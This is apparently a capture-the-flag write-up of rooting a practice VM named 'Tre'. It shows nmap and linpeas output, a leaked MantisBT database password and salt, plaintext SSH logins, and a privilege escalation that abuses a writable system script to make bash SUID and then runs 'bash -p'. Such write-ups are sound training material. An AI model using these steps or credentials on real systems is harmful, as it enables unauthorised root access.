?$ nmap $ip -sC -sV -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-29 09:28 +0000
Nmap scan report for 192.168.68.84
Host is up (0.0062s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:1a:ea:d7:d7:b3:48:80:9f:88:82:2a:14:eb:5f:0e (RSA)
|   256 f4:f6:9c:db:cf:d4:df:6a:91:0a:81:05:de:fa:8d:f8 (ECDSA)
|_  256 ed:b9:a9:d7:2d:00:f8:1b:d3:99:d6:02:e5:ad:17:9f (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Tre
|_http-server-header: Apache/2.4.38 (Debian)
8082/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Tre
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds

dirbuster

/adminer.php
http://192.168.68.84/mantisbt/config/a.txt
# --- Database Configuration ---
$g_hostname      = 'localhost';
$g_db_username   = 'mantissuser';
$g_db_password   = 'password@123AS';
$g_database_name = 'mantis';
$g_db_type       = 'mysqli';

# --- Security ---
$g_crypto_master_salt = 'dsf34H@sds$242347832842309843294829304djfkdjsfkd';	#  Random string of at least 16 chars, unique to the installation

<img width="439" height="254" alt="image" src="https://github.com/user-attachments/assets/30da6816-8c12-488d-b628-dc5f4572bfb2" />

i tried to bruteforce password hash to no avail.

credentials:
administrator	XiBejMub
tre	Tr3@123456A!

ssh into tre
<img width="857" height="84" alt="image" src="https://github.com/user-attachments/assets/883e925f-d450-4285-8529-1fa94dd6c7a7" />


linpeas
???????????? Checking for Copy Fail (CVE-2026-31431) (T1068)
? https://copy.fail/                                                                                      
? https://www.cve.org/CVERecord?id=CVE-2026-31431                                                         
VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered 

CVE: CVE-2019-13272 | Name: PTRACE_TRACEME | Match data: pkg=linux-kernel,ver>=4,ver<5.1.17,sysctl:kernel.yama.ptrace_scope==0,x86_64 | Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*} | Rank: 1 | Details: Requires an active PolKit agent.                                                                                           
CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.                   
CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded    

CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6                                      
CVE-2026-43500 (rxrpc): autoloadable: rxrpc

Sudo < 1.8.28 (User ID bypass)

[+] PATH directory permissions (checking for writable):
drwxr-xr-x 2 root root 4096 May 11  2020 /usr/local/bin
drwxr-xr-x 2 root root 20480 Jul  8  2020 /usr/bin
lrwxrwxrwx 1 root root 7 May 11  2020 /bin -> usr/bin
drwxr-xr-x 2 root root 4096 May 11  2020 /usr/local/games
drwxr-xr-x 2 root root 4096 May  2  2020 /usr/games

/usr/bin/check-system is writable
<img width="467" height="38" alt="image" src="https://github.com/user-attachments/assets/915f74a8-f32a-4195-bd42-c187bcbaf2b1" />

made it give stickybit to binbash
<img width="553" height="227" alt="image" src="https://github.com/user-attachments/assets/3047bb25-4330-41cf-a526-313982535725" />

<img width="513" height="136" alt="image" src="https://github.com/user-attachments/assets/bfddc0cb-dad4-4d70-9fbd-031ba0721bf1" />

<img width="620" height="102" alt="image" src="https://github.com/user-attachments/assets/543ddf97-673b-49d8-bed4-4e8aa3840371" />

bash -p
c<img width="875" height="95" alt="image" src="https://github.com/user-attachments/assets/c431a33f-5c41-4864-8f51-10878986b81c" />







